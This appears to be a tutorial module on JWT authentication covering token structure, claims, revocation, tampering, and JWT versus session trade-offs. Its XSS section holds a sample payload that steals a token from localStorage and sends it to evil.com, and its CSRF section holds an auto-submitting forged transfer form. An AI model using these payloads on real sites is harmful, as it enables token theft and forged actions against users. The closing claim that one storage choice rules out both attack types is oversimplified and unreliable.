# M07: JWT Auth — Deep Concepts

## JWT Structure

A JSON Web Token is three Base64url-encoded strings separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Decoded Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Decoded Payload

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

### Signature

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

---

## Base64url Encoding

Standard Base64 uses `+`, `/`, and `=` (padding). Base64url replaces:
- `+` → `-`
- `/` → `_`
- `=` padding removed

This makes JWTs safe for URL and header transport without additional encoding.

**Example:**
```
Standard Base64:  eyJhbGciOiJIUzI1NiJ9
Base64url:        eyJhbGciOiJIUzI1NiJ9  (no change in this case)
```

---

## Standard Claims

| Claim | Name | Purpose |
|-------|------|---------|
| `iss` | Issuer | Who issued the token (e.g., `https://auth.example.com`) |
| `sub` | Subject | Who the token is about (user ID) |
| `aud` | Audience | Who can accept the token (your API's identifier) |
| `exp` | Expiration | Unix timestamp when token becomes invalid |
| `nbf` | Not Before | Unix timestamp before which token is invalid |
| `iat` | Issued At | Unix timestamp when token was created |
| `jti` | JWT ID | Unique identifier for the token (enables revocation) |

### Why `jti` Matters for Revocation

Since JWTs are stateless, you cannot "un-expire" a token. But if you store revoked `jti` values in a fast cache (Redis) with TTL matching the token's `exp`, you can explicitly revoke tokens before expiry.

---

## What Happens If the Signature Is Tampered With?

**Original token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.SIG1
```

**Attacker changes payload:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.TAMPERED
```

The attacker changed `"role":"user"` to `"role":"admin"` and Base64url-encoded it. But they do not know the secret key. When the server recalculates the signature:

```javascript
const expectedSig = HMACSHA256(header + '.' + tamperedPayload, secret);
// expectedSig !== 'TAMPERED'
```

The verification fails. The server rejects the request with 401.

**Exception:** If the attacker knows the secret (symmetric key leak) or private key (asymmetric key compromise), they can forge valid signatures.

---

## JWT vs Session Trade-offs

| Factor | JWT | Session |
|--------|-----|---------|
| Server state | Stateless | Stateful |
| Revocation | Complex (needs blocklist) | Simple (delete from DB) |
| Horizontal scaling | Trivial | Needs shared store |
| Token size | ~300–500 bytes | ~32 bytes (session ID) |
| Confidentiality | Payload is visible | Opaque session ID |
| CSRF risk | Lower (Bearer header) | Higher (cookie auto-sent) |
| XSS risk | Higher (if localStorage) | Lower (httpOnly cookie) |

---

## XSS vs CSRF in Authentication Context

### XSS (Cross-Site Scripting)

An attacker injects malicious JavaScript into your app. If JWTs are in localStorage:

```javascript
// Attacker's XSS payload
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal?jwt=' + token);
```

**Mitigation:** httpOnly cookies prevent JavaScript from reading the token.

### CSRF (Cross-Site Request Forgery)

An attacker tricks a logged-in user into submitting a form to your API. If the JWT is in a cookie without `SameSite` protection:

```html
<!-- On evil.com -->
<form action="https://bank.com/api/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

The browser automatically attaches the cookie. The server sees a valid request.

**Mitigation:**
- `SameSite=Strict` or `SameSite=Lax` cookies
- Double-submit cookie pattern
- Custom headers (Bearer tokens are CSRF-immune because browsers cannot set arbitrary headers on cross-origin forms)

### Key Insight

- **Bearer tokens in headers:** Immune to CSRF, vulnerable to XSS (if in localStorage)
- **Cookies with httpOnly:** Protected from XSS theft, need CSRF protection

You cannot be vulnerable to both simultaneously with the same token storage mechanism, but you must choose your threat model carefully.
